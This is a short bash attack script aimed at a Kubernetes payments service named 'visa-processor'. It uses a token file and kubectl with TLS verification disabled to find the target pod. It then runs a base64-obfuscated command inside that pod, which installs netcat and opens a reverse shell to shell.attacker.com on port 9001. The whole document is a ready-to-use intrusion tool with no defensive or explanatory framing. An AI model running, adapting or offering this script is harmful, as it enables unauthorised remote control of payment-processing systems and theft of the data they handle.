#!/bin/bash
namespace='payments'
svc='visa-processor-service'
selector="app=visa-processor"
ports='8080:8080'

command='apt update; /usr/bin/apt-get -y install netcat; /bin/nc shell.attacker.com 9001 -e /bin/bash'
inject=$(echo ${command} | base64)


pod=$(kubectl --insecure-skip-tls-verify=true --server=$1 --token $(cat token) -n "$namespace" get pods --selector=${selector} -o jsonpath='{.items[*].metadata.name}') 2>/dev/null 1>&2

echo "☠ - Getting access to pod ${pod}"

sleep 2

kubectl --insecure-skip-tls-verify=true --server=$1 --token $(cat token) -n "$namespace" exec ${pod} -- bash -c  "echo '${inject}' | base64 -d | bash -"

echo "☺ - All done!"
